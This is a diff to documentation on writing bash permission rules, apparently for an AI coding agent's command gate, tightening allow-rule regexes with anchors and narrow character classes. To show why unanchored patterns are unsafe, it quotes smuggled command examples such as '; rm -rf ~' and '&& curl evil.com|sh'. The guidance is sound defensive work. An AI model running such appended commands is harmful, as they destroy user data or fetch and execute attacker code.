@@ -160,19 +160,26 @@ bash_rules:
 bash_rules:
   - name: "Allow pkill for SITL"
     command_pattern: "^pkill$"
-    argument_pattern: ".*SITL.*"
+    argument_pattern: "^-f\\s+SITL$"
     category: other
     decision: allow
 ```
 
-### Allow commands matching a path pattern
+### Allow a specific script, anchored to its real path
 ```yaml
 bash_rules:
-  - name: "Allow scripts in developer/scripts/"
-    command_pattern: ".*/claude/developer/scripts/.*"
+  - name: "Allow the mag-cal flasher script"
+    command_pattern: "^node$"
+    argument_pattern: "^claude/developer/scripts/build/flash-dfu-node\\.js\\s+[\\w./~-]+\\.hex$"
     category: other
     decision: allow
 ```
+Note what each anchor is doing: `^` plus the literal path (not wrapped in an optional group) means a
+same-named script anywhere else on disk won't match; `$` at the end plus a narrow character class on the
+trailing argument (`[\w./~-]+`, no `;`, `&&`, `|`, backticks) means nothing can be appended after the
+legitimate argument and still match. Compare to the unanchored version this replaced,
+`".*(claude/developer/scripts/build/)?flash-dfu-node\\.js\\s+.*\\.hex.*"` — the optional path group and
+the trailing `.*` meant `/tmp/evil/flash-dfu-node.js x.hex; rm -rf ~` matched too.
 
 ### Deny dangerous pattern
 ```yaml
@@ -218,6 +225,16 @@ Use the patterns shown above. Key regex tips:
 - `pattern$` - ends with pattern
 - `\\.` - literal dot (escape in YAML)
 - `\\s+` - whitespace
+
+**For `decision: allow` rules, anchor the pattern — don't leave `.*` at either end unless you mean it.**
+An unanchored `argument_pattern` (e.g. `.*script\\.js.*`, or a path wrapped in an optional group like
+`(some/real/path/)?script\\.js`) matches the real script *and* a same-named script anywhere else on disk,
+*and* extra shell content appended after it (`; rm -rf ~`, `&& curl evil.com|sh`) — because the trailing
+`.*` doesn't stop matching once it's found what it's looking for. This matters most for any rule that lets
+a command execute code or touch hardware (scripts, `dangerouslyDisableSandbox` commands) — anchor those
+with `^`/`$`, require the real path as a literal (not optional), and restrict trailing arguments to a
+narrow character class (e.g. `[\\w./~-]+\\.hex`) instead of `.*`. `deny` rules are the opposite case —
+leave those broad/unanchored so they catch more, not less.
 
 ### Step 4: Validate
 ```bash
